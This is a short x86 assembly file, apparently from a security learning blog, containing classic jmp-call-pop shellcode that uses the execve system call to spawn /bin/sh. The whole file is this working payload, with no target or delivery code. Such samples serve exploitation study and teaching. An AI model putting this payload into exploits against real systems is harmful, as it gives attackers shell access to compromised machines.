	# # # # # # # # # # # # # # # # # # # #
	# sh-pop.s by Novice Live, http://novicelive.org :)
	#
	# feb 18, 2015
	# # # # # # # # # # # # # # # # # # # #
	
	.global _start
_start:
	jmp just_before_str
execve_sh:
	# int execve(const char *filename, char *const argv[], char *const envp[]);
	xorl %eax, %eax
	movb $11, %al
	popl %ebx
	xorl %ecx, %ecx
	xorl %edx, %edx
	int $0x80
just_before_str:
	call execve_sh
	.asciz "/bin/sh"
